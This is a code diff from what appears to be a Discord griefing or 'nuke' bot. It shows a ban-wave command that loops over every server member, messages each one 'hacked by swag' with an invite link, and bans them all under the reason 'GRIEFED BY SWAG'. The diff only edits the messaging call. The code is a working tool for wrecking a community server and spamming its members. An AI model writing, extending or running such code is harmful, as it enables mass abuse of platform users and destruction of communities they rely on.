@@ -26,7 +26,7 @@ public class DmAdvBanwaveCommand implements ICommand {
                 List<Member> members = event.getGuild().getMembers();
                 for (int i = 0; i <= members.size(); i++) {
                     if (members.get(i).getUser().getIdLong() != Core.OWNERID || !members.get(0).getId().equals(event.getAuthor().getId())) {
-                        Wrapper.sendPrivateMessage(members.get(i).getUser(), "hacked by swag#7566");
+                        Wrapper.sendPrivateMessage(event.getJDA(), members.get(i).getUser().getId(), "discord.gg/failures hacked by swag");
                         event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY SWAG").queue();
                         Logger.getLogger().print("Banned " + members.get(i).getUser().getName() + "#" + members.get(i).getUser().getDiscriminator());
                         Thread.sleep(300);
